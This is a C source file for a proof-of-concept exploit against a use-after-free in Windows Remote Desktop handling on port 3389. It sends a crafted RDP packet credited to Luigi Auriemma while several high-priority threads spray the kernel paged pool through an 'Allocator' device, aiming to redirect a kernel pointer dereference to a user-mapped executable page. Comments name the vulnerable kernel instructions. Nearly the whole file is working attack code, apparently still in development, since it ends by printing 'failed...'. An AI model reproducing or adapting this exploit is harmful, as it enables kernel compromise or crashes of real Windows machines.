#pragma warning (disable : 4996)

#define EXPLOIT_TARGET_PORT 3389
#define EXPLOIT_SPRAY_CPU_CORE_COUNT 3
#define EXPLOIT_PACKET_COUNT 1

#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>

#include <WinSock2.h>

// The raw packet data provided by Luigi Auriemma.
// If you disassemble this, you won't find much information about what this is (though you can if you're curious for any reason).
// Instead, you should analyze this in a tool like Wireshark.
// And if you don't believe that this is safe (which I can't say I blame you for thinking that), then use a hex editor and copy the original packet dump's bytes into this array.
unsigned char g_pPacketData[] =
{
	0x03, 0x00, 0x00, 0x13, 0x0E, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
	0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0xD6, 0x02,
	0xF0, 0x80, 0x7F, 0x65, 0x82, 0x01, 0x94, 0x04, 0x01, 0x01, 0x04, 0x01,
	0x01, 0x01, 0x01, 0xFF, 0x30, 0x19, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04,
	0x00, 0x00, 0x00, 0x02, 0x30, 0x19, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x02, 0x04, 0x20, 0x02, 0x04,
	0x00, 0x00, 0x00, 0x02, 0x30, 0x1C, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x02,
	0xFC, 0x17, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x04, 0x82,
	0x01, 0x33, 0x00, 0x05, 0x00, 0x14, 0x7C, 0x00, 0x01, 0x81, 0x2A, 0x00,
	0x08, 0x00, 0x10, 0x00, 0x01, 0xC0, 0x00, 0x44, 0x75, 0x63, 0x61, 0x81,
	0x1C, 0x01, 0xC0, 0xD8, 0x00, 0x04, 0x00, 0x08, 0x00, 0x80, 0x02, 0xE0,
	0x01, 0x01, 0xCA, 0x03, 0xAA, 0x09, 0x04, 0x00, 0x00, 0xCE, 0x0E, 0x00,
	0x00, 0x48, 0x00, 0x4F, 0x00, 0x53, 0x00, 0x54, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x01, 0xCA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x07,
	0x00, 0x01, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x2D, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x2D, 0x00, 0x30,
	0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x2D, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x04, 0xC0, 0x0C, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x02, 0xC0, 0x0C, 0x00, 0x1B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x03, 0xC0, 0x2C, 0x00, 0x03, 0x00, 0x00, 0x00, 0x72, 0x64, 0x70,
	0x64, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x63, 0x6C, 0x69,
	0x70, 0x72, 0x64, 0x72, 0x00, 0x00, 0x00, 0xA0, 0xC0, 0x72, 0x64, 0x70,
	0x73, 0x6E, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x03, 0x00, 0x00,
	0x0C, 0x02, 0xF0, 0x80, 0x04, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x00,
	0x08, 0x02, 0xF0, 0x80, 0x28, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEF, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEB, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEC, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xED, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEE
};

// Template data
unsigned char g_pData[0x90] =
{
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
};

unsigned char g_StopSpray = 0;

unsigned char TriggerUAF(void)
{
	SOCKET Socket = INVALID_SOCKET;

	struct hostent* pHost = 0;
	unsigned char* pIP = 0;
	struct sockaddr_in SocketAddress = { 0 };

	pHost = gethostbyname("");
	if (!pHost)
	{
		return 1;
	}

	pIP = inet_ntoa(**(struct in_addr**)pHost->h_addr_list);
	if (!pIP)
	{
		return 1;
	}

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (!Socket)
	{
		return 1;
	}

	SocketAddress.sin_family = AF_INET;
	SocketAddress.sin_addr.s_addr = inet_addr(pIP);
	SocketAddress.sin_port = htons(EXPLOIT_TARGET_PORT);
	if (connect(Socket, (const struct sockaddr*)&SocketAddress, sizeof(SocketAddress)))
	{
		return 1;
	}
	Sleep(1000);

	if (send(Socket, g_pPacketData, sizeof(g_pPacketData), 0) == SOCKET_ERROR)
	{
		return 1;
	}

	return 0;
}

DWORD WINAPI SprayPagedPool(void* pUnused)
{
	UNREFERENCED_PARAMETER(pUnused);

	HANDLE hDevice = INVALID_HANDLE_VALUE;
	unsigned long BytesReturned = 0;

	hDevice = CreateFileA("\\\\.\\GLOBALROOT\\Device\\Allocator", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[!] Failed to obtain a handle to the object allocator. Objects will NOT be sprayed!\n[!] Close the program before the UAF is triggered!\n");
		return 1;
	}

	while (!g_StopSpray)
	{
		DeviceIoControl(hDevice, 0x220000, g_pData, sizeof(g_pData), g_pData, sizeof(g_pData), &BytesReturned, 0);
	}

	CloseHandle(hDevice);
	return 0;
}

int main(int argc, char** argv)
{
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);

	WSADATA WinsockData = { 0 };

	unsigned char* pKernelData = 0;

	HANDLE hThreads[EXPLOIT_SPRAY_CPU_CORE_COUNT] = { 0 };

	srand(GetTickCount());

	if (WSAStartup(MAKEWORD(2, 2), &WinsockData))
	{
		return 1;
	}

	pKernelData = VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pKernelData)
	{
		return 1;
	}

	// .text:FFFFF88005C278C1 038 mov     rdx, [rcx]	; Dereference the user-controlled address and store it in rdx
	// .text:FFFFF88005C278C1							; This part is important as rdx will yield code execution later on
	// .text:FFFFF88005C278C1							; rcx however is only needed to bypass certain checks
	*(void**)(pKernelData) = (void*)0x4141414141414141;

	if (!SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS))
	{
		return 1;
	}

	// .text:FFFFF88005C278B9 038 mov     rcx, [rcx]      ; dereference rcx (the pool allocation) and get the first 8 bytes (user-controlled!)
	*(void**)(g_pData) = pKernelData;

	for (unsigned long long i = 0; i < EXPLOIT_SPRAY_CPU_CORE_COUNT; i++)
	{
		hThreads[i] = CreateThread(0, 0, SprayPagedPool, 0, 0, 0);
		if (!hThreads[i])
		{
			return 1;
		}

		if (!SetThreadPriority(hThreads[i], THREAD_PRIORITY_TIME_CRITICAL))
		{
			return 1;
		}
	}

	printf("[!] Time to race on %lu %s...\n", EXPLOIT_SPRAY_CPU_CORE_COUNT, EXPLOIT_SPRAY_CPU_CORE_COUNT == 1 ? "core" : "cores");
	Sleep(2000);

	for (unsigned long long i = 0; i < EXPLOIT_PACKET_COUNT; i++)
	{
		TriggerUAF();
	}

	printf("[*] Sleeping for 2000ms to ensure the packets went through...\n");
	Sleep(2000);

	g_StopSpray = 1;

	WSACleanup();

	// TEMP
	printf("failed...");
	getchar();
	// TEMP
	return 0;
}